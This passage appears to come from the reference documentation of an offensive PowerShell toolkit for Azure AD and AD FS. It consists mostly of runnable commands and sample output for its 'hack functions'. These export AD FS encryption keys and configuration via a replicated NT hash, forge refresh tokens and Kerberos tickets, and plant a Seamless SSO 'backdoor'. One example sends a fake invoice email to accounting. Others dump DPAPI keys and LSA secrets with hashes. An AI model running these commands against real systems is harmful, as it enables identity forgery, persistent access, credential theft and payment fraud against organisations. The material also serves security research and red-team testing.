<span class="nb">Export-AADIntADFSCertificates</span> <span class="n">-Configuration</span> <span class="nv">$ADFSConfig</span> <span class="n">-Key</span> <span class="nv">$ADFSKey</span>
</code></pre></div>
<p></p>

<h3 id="export-aadintadfsconfiguration">Export-AADIntADFSConfiguration (*)</h3>

<p>Since version 0.4.7 <br>
Exports AD FS configuration from the local AD FS server (local database) or from remote server (ADFS sync).</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Export the configuration from the local database</span>
<span class="nv">$config</span> <span class="p">=</span> <span class="nb">Export-AADIntADFSConfiguration</span> <span class="n">-Local</span>
</code></pre></div>
<p></p>

<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the AD FS service account guid and sid</span>
<span class="nb">Get-ADObject</span> <span class="n">-filter</span> <span class="p">*</span> <span class="n">-Properties</span> <span class="n">objectguid</span><span class="p">,</span><span class="n">objectsid</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="n">name</span> <span class="o">-eq</span> <span class="n">sv_ADFS</span> <span class="p">|</span> <span class="nb">Format-List</span> <span class="n">Name</span><span class="p">,</span><span class="n">ObjectGuid</span><span class="p">,</span><span class="n">ObjectSid</span>
</code></pre></div>
<p></p>

<pre><code>Name       : sv_ADFS
ObjectGuid : b6366885-73f0-4239-9cd9-4f44a0a7bc79
ObjectSid  : S-1-5-21-2918793985-2280761178-2512057791-1134
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Save the credentials with directory replication rights</span>
<span class="nv">$creds</span> <span class="p">=</span> <span class="nb">Get-Credential</span>

<span class="c"># Get the NTHash of the ADFS service user</span>
<span class="nv">$hash</span> <span class="p">=</span> <span class="nb">Get-AADIntADUserNTHash</span> <span class="n">-ObjectGuid</span> <span class="s2">"b6366885-73f0-4239-9cd9-4f44a0a7bc79"</span> <span class="n">-Credentials</span> <span class="nv">$creds</span> <span class="n">-Server</span> <span class="n">dc</span><span class="p">.</span><span class="n">company</span><span class="p">.</span><span class="n">com</span> <span class="n">-AsHex</span>

<span class="c"># Get the configuration remotely</span>
<span class="nv">$configuration</span> <span class="p">=</span> <span class="nb">Export-ADFSConfiguration</span> <span class="n">-Hash</span> <span class="nv">$hash</span> <span class="n">-SID</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">2918793985</span><span class="p">-</span><span class="n">2280761178</span><span class="p">-</span><span class="n">2512057791</span><span class="p">-</span><span class="n">1134</span> <span class="n">-Server</span> <span class="n">sts</span><span class="p">.</span><span class="n">company</span><span class="p">.</span><span class="n">com</span>
</code></pre></div>


<p><strong>Example 3:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Export configuration remotely as a logged in user and store to variable</span>
<span class="nv">$ADFSConfig</span> <span class="p">=</span> <span class="nb">Export-AADIntADFSConfiguration</span> <span class="n">-Server</span> <span class="n">sts</span><span class="p">.</span><span class="n">company</span><span class="p">.</span><span class="n">com</span> <span class="n">-AsLoggedInUser</span>
</code></pre></div>
<p></p>

<h3 id="export-aadintadfsencryptionkey">Export-AADIntADFSEncryptionKey (*)</h3>

<p>Since version 0.4.7 <br>
Exports ADFS configuration encryption Key from the local ADFS server either as a logged-in user or ADFS service account, or remotely using DSR.</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Export the encryption key locally</span>
<span class="nv">$key</span> <span class="p">=</span> <span class="nb">Export-AADIntADFSEncryptionKey</span> <span class="n">-Local</span> <span class="n">-Configuration</span> <span class="nv">$configuration</span>
</code></pre></div>
<p></p>

<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Save the credentials with directory replication rights</span>
<span class="nv">$creds</span> <span class="p">=</span> <span class="nb">Get-Credential</span>

<span class="c"># Export the encryption key remotely</span>
<span class="nv">$key</span> <span class="p">=</span> <span class="nb">Export-AADIntADFSEncryptionKey</span> <span class="n">-Server</span> <span class="n">dc</span><span class="p">.</span><span class="n">company</span><span class="p">.</span><span class="n">com</span> <span class="n">-Credentials</span> <span class="nv">$creds</span> <span class="n">-ObjectGuid</span> <span class="n">91491383-d748</span><span class="p">-</span><span class="n">4163</span><span class="p">-</span><span class="n">9e50</span><span class="p">-</span><span class="n">9c3c86ad1fbd</span>
</code></pre></div>
<p></p>

<h3 id="set-aadintadfsconfiguration">Set-AADIntADFSConfiguration (*)</h3>

<p>Since version 0.4.8 <br>
Sets configuration of the local AD FS server.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get Policy Store Authorisation Policy rules from the local AD FS</span>
<span class="nv">$authPolicy</span> <span class="p">=</span> <span class="nb">Get-AADIntADFSPolicyStoreRules</span>

<span class="c"># Get the configuration from the local AD FS server and set read-only policy to allow all to read</span>
<span class="nv">$config</span> <span class="p">=</span> <span class="nb">Set-AADIntADFSPolicyStoreRules</span> <span class="n">-AuthorizationPolicy</span> <span class="nv">$authPolicy</span><span class="p">.</span><span class="n">AuthorizationPolicy</span>

<span class="c"># Set the configuration to the local AD FS database</span>
<span class="nb">Set-AADIntADFSConfiguration</span> <span class="n">-Configuration</span> <span class="nv">$config</span>
</code></pre></div>
<p></p>

<h3 id="get-aadintadfspolicystorerules">Get-AADIntADFSPolicyStoreRules (*)</h3>

<p>Since version 0.4.8 <br>
Gets AD FS PolicyStore Authorisation Policy rules from the given configuration or from local AD FS server.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get Policy Store Authorisation Policy rules from the local AD FS</span>
<span class="nb">Get-AADIntADFSPolicyStoreRules</span> <span class="p">|</span> <span class="nb">Format-List</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>AuthorizationPolicyReadOnly : @RuleName = "Permit Service Account"
                              exists([Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/primarysid", Value == "S-1-5-21-2108354183-1066939247-874701363-3086"])
                               =&gt; issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true");

                              @RuleName = "Permit Local Administrators"
                              exists([Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid", Value == "S-1-5-32-544"])
                               =&gt; issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true");

AuthorizationPolicy         : @RuleName = "Permit Service Account"
                              exists([Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/primarysid", Value == "S-1-5-21-2108354183-1066939247-874701363-3086"])
                               =&gt; issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true");

                              @RuleName = "Permit Local Administrators"
                              exists([Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid", Value == "S-1-5-32-544"])
                               =&gt; issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true");
</code></pre>

<h3 id="set-aadintadfspolicystorerules">Set-AADIntADFSPolicyStoreRules (*)</h3>

<p>Since version 0.4.8 <br>
Sets AD FS PolicyStore Authorisation Policy rules and returns the modified configuration (xml document).
The initial configuration can be provided with -Configuration parameter. If not provided, it will be
fetched from the local AD FS server.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get Policy Store Authorisation Policy rules from the local AD FS</span>
<span class="nv">$authPolicy</span> <span class="p">=</span> <span class="nb">Get-AADIntADFSPolicyStoreRules</span>

<span class="c"># Get the configuration from the local AD FS server and set read-only policy to allow all to read</span>
<span class="nv">$config</span> <span class="p">=</span> <span class="nb">Set-AADIntADFSPolicyStoreRules</span> <span class="n">-AuthorizationPolicy</span> <span class="nv">$authPolicy</span><span class="p">.</span><span class="n">AuthorizationPolicy</span>

<span class="c"># Set the configuration to the local AD FS database</span>
<span class="nb">Set-AADIntADFSConfiguration</span> <span class="n">-Configuration</span> <span class="nv">$config</span>
</code></pre></div>
<p></p>

<h3 id="new-aadintadfsrefreshtoken">New-AADIntADFSRefreshToken (*)</h3>

<p>Since version 0.6.5 <br>
Creates a new AD FS Refresh Token with the given certificate.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Create a new refresh token</span>
<span class="nv">$refresh_token</span> <span class="p">=</span> <span class="nb">New-AADIntADFSRefreshToken</span> <span class="n">-UserPrincipalName</span> <span class="s2">"user@company.com"</span> <span class="n">-Resource</span> <span class="s2">"urn:microsoft:userinfo"</span> <span class="n">-Issuer</span> <span class="s2">"http://sts.company.com/adfs/services/trust"</span> <span class="n">-PfxFileName_encryption</span> <span class="p">.\</span><span class="n">ADFS_encryption</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-PfxFileName_signing</span> <span class="p">.\</span><span class="n">ADFS_signing</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-ClientID</span> <span class="s2">"5846ec9c-1cd7-4040-8630-6ae82d6cdfd3"</span>

<span class="c"># Create a request body</span>
<span class="nv">$body</span><span class="p">=@{</span>
        <span class="s2">"client_id"</span>     <span class="p">=</span> <span class="s2">"5846ec9c-1cd7-4040-8630-6ae82d6cdfd3"</span>
        <span class="s2">"refresh_token"</span> <span class="p">=</span> <span class="nv">$refresh_token</span>
        <span class="s2">"grant_type"</span>    <span class="p">=</span> <span class="s2">"refresh_token"</span>
    <span class="p">}</span>

<span class="c"># Make a http request to AD FS server to fetch the token</span>
<span class="nv">$response</span> <span class="p">=</span> <span class="nb">Invoke-RestMethod</span> <span class="n">-UseBasicParsing</span> <span class="n">-Uri</span> <span class="s2">"https://sts.company.com/adfs/services/trust/adfs/oauth2/token"</span> <span class="n">-Method</span> <span class="n">Post</span> <span class="n">-Body</span> <span class="nv">$body</span>
<span class="nv">$access_token</span> <span class="p">=</span> <span class="nv">$response</span><span class="p">.</span><span class="n">access_token</span>
</code></pre></div>
<p></p>

<h3 id="unprotect-aadintadfsrefreshtoken">Unprotect-AADIntADFSRefreshToken (*)</h3>

<p>Since version 0.6.5 <br>
Decrypts and verifies the given AD FS generated Refresh Token with the given certificates.</p>

<p>The SingleSignOnToken is a deflated binary xml, which is decoded in SSOToken attribute.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Decrypt the refresh token</span>
<span class="nb">Unprotect-ADFSRefreshToken</span> <span class="n">-RefreshToken</span> <span class="nv">$refresh_token</span> <span class="n">-PfxFileName_encryption</span> <span class="p">.\</span><span class="n">ADFS_encryption</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-PfxFileName_signing</span> <span class="p">.\</span><span class="n">ADFS_signing</span><span class="p">.</span><span class="n">pfx</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>ClientID           : 5846ec9c-1cd7-4040-8630-6ae82d6cdfd3
RedirectUri        : 
Resource           : urn:microsoft:userinfo
Issuer             : http://sts.company.com/adfs/services/trust
NotBefore          : 1635414030
ExpiresOn          : 1635442830
SingleSignOnToken  : {"TokenType":0,"StringToken":"vVV[redacted]W/gE=","Version":1}
DeviceFlowDeviceId : 
IsDeviceFlow       : False
SessionKeyString   : 
SSOToken           : &lt;SessionToken&gt;[redacted]&lt;/SessionToken&gt;
</code></pre>

<p><strong>Decoded SingleSignOnToken (SSOToken):</strong>
</p><div class="highlight"><pre><code class="language-xml" data-lang="xml"><span></span><span class="nt">&lt;SessionToken&gt;</span>
<span class="w">	</span><span class="nt">&lt;Version&gt;</span>1<span class="nt">&lt;/Version&gt;</span>
<span class="w">	</span><span class="nt">&lt;SecureConversationVersion&gt;</span>http://docs.oasis-open.org/ws-sx/ws-secureconversation/200512<span class="nt">&lt;/SecureConversationVersion&gt;</span>
<span class="w">	</span><span class="nt">&lt;Id&gt;</span>_7f964293-a538-4d21-9f7f-ff145282b6cb-D8AA6F46060589889967919067D5D6C5<span class="nt">&lt;/Id&gt;</span>
<span class="w">	</span><span class="nt">&lt;ContextId&gt;</span>urn:uuid:93dfe940-6b96-4ed3-87d0-e34c1fb64782<span class="nt">&lt;/ContextId&gt;</span>
<span class="w">	</span><span class="nt">&lt;Key&gt;</span>7NBs5rV5S0nDLF04psPMqg==<span class="nt">&lt;/Key&gt;</span>
<span class="w">	</span><span class="nt">&lt;KeyGeneration&gt;</span>urn:uuid:bb1a61ac-9527-4cd6-9a6d-1a957063deb6<span class="nt">&lt;/KeyGeneration&gt;</span>
<span class="w">	</span><span class="nt">&lt;EffectiveTime&gt;</span>637710108306674318<span class="nt">&lt;/EffectiveTime&gt;</span>
<span class="w">	</span><span class="nt">&lt;ExpiryTime&gt;</span>637710396306674318<span class="nt">&lt;/ExpiryTime&gt;</span>
<span class="w">	</span><span class="nt">&lt;KeyEffectiveTime&gt;</span>637710108306674318<span class="nt">&lt;/KeyEffectiveTime&gt;</span>
<span class="w">	</span><span class="nt">&lt;KeyExpiryTime&gt;</span>637710396306674318<span class="nt">&lt;/KeyExpiryTime&gt;</span>
<span class="w">	</span><span class="nt">&lt;ClaimsPrincipal&gt;</span>
<span class="w">		</span><span class="nt">&lt;Identities&gt;</span>
<span class="w">			</span><span class="nt">&lt;Identity</span><span class="w"> </span><span class="na">NameClaimType=</span><span class="s">"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name"</span><span class="w"> </span><span class="na">RoleClaimType=</span><span class="s">"http://schemas.microsoft.com/ws/2008/06/identity/claims/role"</span><span class="nt">&gt;</span>
<span class="w">				</span><span class="nt">&lt;ClaimCollection&gt;</span>
<span class="w">					</span><span class="nt">&lt;Claim</span><span class="w"> </span><span class="na">Issuer=</span><span class="s">"LOCAL AUTHORITY"</span><span class="w"> </span><span class="na">OriginalIssuer=</span><span class="s">"LOCAL AUTHORITY"</span><span class="w"> </span><span class="na">Type=</span><span class="s">"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/implicitupn"</span><span class="w">             </span><span class="na">Value=</span><span class="s">"user@company.com"</span><span class="w">                                                           </span><span class="na">ValueType=</span><span class="s">"http://www.w3.org/2001/XMLSchema#string"</span><span class="nt">/&gt;</span>
<span class="w">					</span><span class="nt">&lt;Claim</span><span class="w"> </span><span class="na">Issuer=</span><span class="s">"LOCAL AUTHORITY"</span><span class="w"> </span><span class="na">OriginalIssuer=</span><span class="s">"LOCAL AUTHORITY"</span><span class="w"> </span><span class="na">Type=</span><span class="s">"http://schemas.microsoft.com/claims/authnmethodsproviders"</span><span class="w">                     </span><span class="na">Value=</span><span class="s">"FormsAuthentication"</span><span class="w">                                                        </span><span class="na">ValueType=</span><span class="s">"http://www.w3.org/2001/XMLSchema#string"</span><span class="nt">/&gt;</span>
<span class="w">					</span><span class="nt">&lt;Claim</span><span class="w"> </span><span class="na">Issuer=</span><span class="s">"AD AUTHORITY"</span><span class="w">    </span><span class="na">OriginalIssuer=</span><span class="s">"AD AUTHORITY"</span><span class="w">    </span><span class="na">Type=</span><span class="s">"http://schemas.microsoft.com/ws/2008/06/identity/claims/authenticationinstant"</span><span class="w"> </span><span class="na">Value=</span><span class="s">"2021-10-28T09:40:30.618Z"</span><span class="w">                                                   </span><span class="na">ValueType=</span><span class="s">"http://www.w3.org/2001/XMLSchema#dateTime"</span><span class="nt">/&gt;</span>
<span class="w">					</span><span class="nt">&lt;Claim</span><span class="w"> </span><span class="na">Issuer=</span><span class="s">"LOCAL AUTHORITY"</span><span class="w"> </span><span class="na">OriginalIssuer=</span><span class="s">"LOCAL AUTHORITY"</span><span class="w"> </span><span class="na">Type=</span><span class="s">"http://schemas.microsoft.com/ws/2008/06/identity/claims/authenticationmethod"</span><span class="w">  </span><span class="na">Value=</span><span class="s">"urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport"</span><span class="w">          </span><span class="na">ValueType=</span><span class="s">"http://www.w3.org/2001/XMLSchema#string"</span><span class="nt">/&gt;</span>
<span class="w">					</span><span class="nt">&lt;Claim</span><span class="w"> </span><span class="na">Issuer=</span><span class="s">"AD AUTHORITY"</span><span class="w">    </span><span class="na">OriginalIssuer=</span><span class="s">"AD AUTHORITY"</span><span class="w">    </span><span class="na">Type=</span><span class="s">"http://schemas.microsoft.com/ws/2014/01/identity/claims/anchorclaimtype"</span><span class="w">       </span><span class="na">Value=</span><span class="s">"http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname"</span><span class="w"> </span><span class="na">ValueType=</span><span class="s">"http://www.w3.org/2001/XMLSchema#string"</span><span class="nt">/&gt;</span>
<span class="w">					</span><span class="nt">&lt;Claim</span><span class="w"> </span><span class="na">Issuer=</span><span class="s">"AD AUTHORITY"</span><span class="w">    </span><span class="na">OriginalIssuer=</span><span class="s">"AD AUTHORITY"</span><span class="w">    </span><span class="na">Type=</span><span class="s">"http://schemas.microsoft.com/ws/2014/01/identity/claims/accountstore"</span><span class="w">          </span><span class="na">Value=</span><span class="s">"AD AUTHORITY"</span><span class="w">                                                               </span><span class="na">ValueType=</span><span class="s">"http://www.w3.org/2001/XMLSchema#string"</span><span class="nt">/&gt;</span>
<span class="w">					</span><span class="nt">&lt;Claim</span><span class="w"> </span><span class="na">Issuer=</span><span class="s">"LOCAL AUTHORITY"</span><span class="w"> </span><span class="na">OriginalIssuer=</span><span class="s">"LOCAL AUTHORITY"</span><span class="w"> </span><span class="na">Type=</span><span class="s">"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"</span><span class="w">                     </span><span class="na">Value=</span><span class="s">"user@company.com"</span><span class="w">                                                           </span><span class="na">ValueType=</span><span class="s">"http://www.w3.org/2001/XMLSchema#string"</span><span class="nt">/&gt;</span>
<span class="w">					</span><span class="nt">&lt;Claim</span><span class="w"> </span><span class="na">Issuer=</span><span class="s">"AD AUTHORITY"</span><span class="w">    </span><span class="na">OriginalIssuer=</span><span class="s">"AD AUTHORITY"</span><span class="w">    </span><span class="na">Type=</span><span class="s">"http://schemas.microsoft.com/ws/2008/06/identity/claims/primarygroupsid"</span><span class="w">       </span><span class="na">Value=</span><span class="s">"S-1-5-21-2918793985-2280761178-2512057791-513"</span><span class="w">                              </span><span class="na">ValueType=</span><span class="s">"http://www.w3.org/2001/XMLSchema#string"</span><span class="nt">/&gt;</span>
<span class="w">					</span><span class="nt">&lt;Claim</span><span class="w"> </span><span class="na">Issuer=</span><span class="s">"AD AUTHORITY"</span><span class="w">    </span><span class="na">OriginalIssuer=</span><span class="s">"AD AUTHORITY"</span><span class="w">    </span><span class="na">Type=</span><span class="s">"http://schemas.microsoft.com/ws/2008/06/identity/claims/primarysid"</span><span class="w">            </span><span class="na">Value=</span><span class="s">"S-1-5-21-2918793985-2280761178-2512057791-1602"</span><span class="w">                             </span><span class="na">ValueType=</span><span class="s">"http://www.w3.org/2001/XMLSchema#string"</span><span class="nt">/&gt;</span>
<span class="w">					</span><span class="nt">&lt;Claim</span><span class="w"> </span><span class="na">Issuer=</span><span class="s">"AD AUTHORITY"</span><span class="w">    </span><span class="na">OriginalIssuer=</span><span class="s">"AD AUTHORITY"</span><span class="w">    </span><span class="na">Type=</span><span class="s">"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name"</span><span class="w">                    </span><span class="na">Value=</span><span class="s">"COMPANY\user"</span><span class="w">                                                               </span><span class="na">ValueType=</span><span class="s">"http://www.w3.org/2001/XMLSchema#string"</span><span class="nt">/&gt;</span>
<span class="w">					</span><span class="nt">&lt;Claim</span><span class="w"> </span><span class="na">Issuer=</span><span class="s">"AD AUTHORITY"</span><span class="w">    </span><span class="na">OriginalIssuer=</span><span class="s">"AD AUTHORITY"</span><span class="w">    </span><span class="na">Type=</span><span class="s">"http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname"</span><span class="w">    </span><span class="na">Value=</span><span class="s">"COMPANY\user"</span><span class="w">                                                               </span><span class="na">ValueType=</span><span class="s">"http://www.w3.org/2001/XMLSchema#string"</span><span class="nt">/&gt;</span>
<span class="w">					</span><span class="nt">&lt;Claim</span><span class="w"> </span><span class="na">Issuer=</span><span class="s">"LOCAL AUTHORITY"</span><span class="w"> </span><span class="na">OriginalIssuer=</span><span class="s">"LOCAL AUTHORITY"</span><span class="w"> </span><span class="na">Type=</span><span class="s">"http://schemas.microsoft.com/claims/authnmethodsreferences"</span><span class="w">                    </span><span class="na">Value=</span><span class="s">"urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport"</span><span class="w">          </span><span class="na">ValueType=</span><span class="s">"http://www.w3.org/2001/XMLSchema#string"</span><span class="nt">/&gt;</span>
<span class="w">				</span><span class="nt">&lt;/ClaimCollection&gt;</span>
<span class="w">			</span><span class="nt">&lt;/Identity&gt;</span>
<span class="w">		</span><span class="nt">&lt;/Identities&gt;</span>
<span class="w">	</span><span class="nt">&lt;/ClaimsPrincipal&gt;</span>
<span class="w">	</span><span class="nt">&lt;EndpointId/&gt;</span>
<span class="nt">&lt;/SessionToken&gt;</span>
</code></pre></div>
<p></p>

<h2 id="hack-functions-seamless-single-sign-on-desktopsso">Hack functions: Seamless Single-sign-on (DesktopSSO)</h2>

<h3 id="get-aadintdesktopsso-p">Get-AADIntDesktopSSO (P)</h3>

<p>Since version 0.2.6 <br>
Shows the Desktop SSO (a.k.a. Seamless SSO) status of the tenant.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Create an access token for PTA</span>
<span class="nv">$pt</span><span class="p">=</span><span class="nb">Get-AADIntAccessTokenForPTA</span>

<span class="c"># Show the DesktopSSO status</span>
<span class="nb">Get-AADIntDesktopSSO</span> <span class="n">-AccessToken</span> <span class="nv">$pt</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Domains      : 
Enabled      : False
ErrorMessage : 
Exists       : True
IsSuccessful : True
</code></pre>

<h3 id="set-aadintdesktopssoenabled-p">Set-AADIntDesktopSSOEnabled (P)</h3>

<p>Since version 0.2.6 <br>
Enables or disables DesktopSSO for the tenant.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Create an access token for PTA</span>
<span class="nv">$pt</span><span class="p">=</span><span class="nb">Get-AADIntAccessTokenForPTA</span>

<span class="c"># Enable the DesktopSSO for the tenant</span>
<span class="nb">Set-AADIntDesktopSSOEnabled</span> <span class="n">-AccessToken</span> <span class="nv">$pt</span> <span class="n">-Enable</span> <span class="nv">$true</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Domains      : company.com
Enabled      : True
ErrorMessage : 
Exists       : True
IsSuccessful : True
</code></pre>

<h3 id="set-aadintdesktopsso-p">Set-AADIntDesktopSSO (P)</h3>

<p>Since version 0.2.6 <br>
Enables or disables DesktopSSO for the given domain. In other words, <strong>you can create a backdoor!</strong>
It can also be used to change the password of the existing DesktopSSO configuration to AzureAD and to reset the password of the computer account used for SSO (default is AZUREADSSOACC).</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Create an access token for PTA</span>
<span class="nv">$pt</span><span class="p">=</span><span class="nb">Get-AADIntAccessTokenForPTA</span>

<span class="c"># Enable the DesktopSSO for the given domain</span>
<span class="nb">Set-AADIntDesktopSSO</span> <span class="n">-AccessToken</span> <span class="nv">$pt</span> <span class="n">-DomainName</span> <span class="n">company</span><span class="p">.</span><span class="n">com</span> <span class="n">-Password</span> <span class="s2">"mypassword"</span> <span class="n">-Enable</span> <span class="nv">$true</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>IsSuccessful ErrorMessage
------------ ------------
        True
</code></pre>

<p></p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Show the DesktopSSO status</span>
<span class="nb">Get-AADIntDesktopSSO</span> <span class="n">-AccessToken</span> <span class="nv">$pt</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>Domains      : company.com
Enabled      : True
ErrorMessage : 
Exists       : True
IsSuccessful : True
</code></pre>

<h3 id="new-aadintkerberosticket">New-AADIntKerberosTicket</h3>

<p>Since version 0.2.6 <br>
This function creates a Kerberos ticket with given user details and server (usually AZUREADSSOACC) password. Uses only user’s SID and server password.</p>

<p>User SID can be given as a SID object, SID string, or UserPrincipalNane (UPN). If UPN is given, SID is searched from AD or AAD.
For AD, the user running the command need to have read access to AD. For AAD, an access token for Azure AD Graph needs to be given.</p>

<p><strong>Note!</strong> The Kerberos ticket is valid only for a couple of minutes!</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Create a Kerberos ticket</span>
<span class="nv">$kt</span><span class="p">=</span><span class="nb">New-AADIntKerberosTicket</span> <span class="n">-ADUserPrincipalName</span> <span class="s2">"user@company.com"</span> <span class="n">-Password</span> <span class="s2">"mypassword"</span>

<span class="c"># Get an access token for Exchange Online</span>
<span class="nv">$et</span><span class="p">=</span><span class="nb">Get-AADIntAccessTokenForEXO</span> <span class="n">-KerberosTicket</span> <span class="nv">$kt</span> <span class="n">-Domain</span> <span class="n">company</span><span class="p">.</span><span class="n">com</span>

<span class="c"># Send an email using Outlook API</span>
<span class="nb">Send-AADIntOutlookMessage</span> <span class="n">-AccessToken</span> <span class="nv">$et</span> <span class="n">-Recipient</span> <span class="s2">"accounting@company.com"</span> <span class="n">-Subject</span> <span class="s2">"Invoice"</span> <span class="n">-Message</span> <span class="s2">"Pay the attached invoice &lt;b&gt;ASAP!&lt;/b&gt;"</span>
</code></pre></div>
<p></p>

<h2 id="hack-functions-active-directory">Hack functions: Active Directory</h2>

<h3 id="get-aadintdpapikeys">Get-AADIntDPAPIKeys (*)</h3>

<p>Since version 0.3.0 <br>
Gets DPAPI system keys which can be used to decrypt secrets of all users encrypted with DPAPI.
MUST be run on a domain controller as an administrator.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get DPAPI keys</span>
<span class="nb">Get-AADIntDPAPIKeys</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>UserKey               UserKeyHex                               MachineKey            MachineKeyHex                           
-------               ----------                               ----------            -------------                           
{16, 130, 39, 122...} 1082277ac85a532018930b782c30b7f2f91f7677 {226, 88, 102, 95...} e258665f0a016a7c215ceaf29ee1ae17b9f017b9
</code></pre>

<h3 id="get-aadintlsasecrets">Get-AADIntLSASecrets (*)</h3>

<p>Since version 0.3.0 <br>
Gets computer’s Local Security Authority (LSA) secrets. MUST be run as an administrator.</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get LSA secrets</span>
<span class="nb">Get-AADIntLSASecrets</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Name        : $MACHINE.ACC
Account     : 
Password    : {131, 100, 104, 117...}
PasswordHex : 836468758afd792..
PasswordTxt : 撃畨ﶊ⵹脅䰐血⺹颶姾..
Credentials : 
MD4         : {219, 201, 145, 228...}
SHA1        : {216, 95, 90, 3...}
MD4Txt      : dbc991e4e611cf4dbd0d853f54489caf
SHA1Txt     : d85f5a030b06061329ba93ac7da2f446981a02b6

Name        : DPAPI_SYSTEM
Account     : 
Password    : {1, 0, 0, 0...}
PasswordHex : 010000000c63b569390..
PasswordTxt :  挌榵9႘ૂਧ绣똚鲐쒽뾮㌡懅..
Credentials : 
MD4         : {85, 41, 246, 248...}
SHA1        : {32, 31, 39, 107...}
MD4Txt      : 5529f6f89c797f7d95224a554f460ea5
SHA1Txt     : 201f276b05fa087a0b7e37f7052d581813d52b46

Name        : NL$KM
Account     : 
Password    : {209, 118, 66, 10...}
PasswordHex : d176420abde330d3e443212b...
PasswordTxt : 监ੂ팰䏤⬡ꎛ녀䚃劤⪠钤␎／뜕ະ׏...
Credentials : 
MD4         : {157, 45, 19, 202...}
SHA1        : {197, 144, 115, 117...}
MD4Txt      : 9d2d13cac899b491114129e5ebe00939
SHA1Txt     : c590737514c8f22607fc79d771b61b1a1505c3ee

Name        : _SC_AADConnectProvisioningAgent
Account     : COMPANY\provAgentgMSA
Password    : {176, 38, 6, 7...}
PasswordHex : b02606075f962ab4474bd570dc..
PasswordTxt : ⚰܆陟됪䭇...
Credentials : System.Management.Automation.PSCredential
MD4         : {123, 211, 194, 182...}
SHA1        : {193, 238, 187, 166...}
MD4Txt      : 7bd3c2b62b66024e4e066a1f4902221e
SHA1Txt     : c1eebba61a72d8a4e78b1cefd27c555b83a39cb4

Name        : _SC_ADSync
Account     : COMPANY\AAD_5baf82738e9c
Password    : {41, 0, 45, 0...}
PasswordHex : 29002d004e0024002a00...
PasswordTxt : )-N$*s=322jSQnm-YG#z2z...
Credentials : System.Management.Automation.PSCredential
MD4         : {81, 210, 222, 155...}
SHA1        : {94, 74, 122, 142...}
MD4Txt      : 51d2de9b89b81d0cb371a829a2d19fe2
SHA1Txt     : 5e4a7a8e220652c11cf64d25b1dcf63da7ce4bf1

Name        : _SC_GMSA_DPAPI_{C6810348-4834-4a1e-817D-5838604E6004}_15030c93b7affb1fe7dc418b9dab42addf5
			  74c56b3e7a83450fc4f3f8a382028
Account     : 
Password    : {131, 250, 57, 146...}
PasswordHex : 83fa3992cd076f3476e8be7e04...
PasswordTxt : 廙鈹ߍ㑯纾�≦瀛･௰镭꾔浪�ꨲ컸Ｏ⩂�..
Credentials : 
